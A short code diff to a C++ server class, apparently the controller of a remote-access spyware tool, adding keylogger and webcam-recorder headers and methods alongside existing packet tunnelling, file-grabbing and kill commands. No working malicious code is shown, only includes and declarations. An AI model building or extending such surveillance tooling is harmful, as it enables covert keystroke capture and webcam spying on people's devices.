@@ -21,7 +21,9 @@
 #include <filesystem>
 #include <chrono>
 #include <thread>
-#include "spy_tunnel.hpp"
+#include "keylogger.hpp"
+#include "webcam_recorder.hpp"
+#include "packet_tunnel.hpp"
 #include "common.hpp"
 #include "event_logger.hpp"
 #include "server_macros.hpp"
@@ -38,7 +40,7 @@
 #define OUT_ARG 8
 #define FILE_NAME_ARG 9
 #define DEVICE_ARG 10
-#define KB_LAYOUT_ARG 11 
+#define KB_LAYOUT_ARG 11
 
 #define ARG_TYPE_INT 0x1A
 #define ARG_TYPE_STRING 0x1B
@@ -110,10 +112,11 @@ private:
     void set_verbosity();
     void show_verbosity();
     void kill();
-    void keylogger();
     void get_dev();
     void get_file();
-
+    void keylogger();
+    void webcam_recorder();
+    
     uint find_open_port();
     void send_packet(uint16_t __packet, int __client_index);    
     void send_client(CommandCode __command, uint8_t __port, int __client_index);
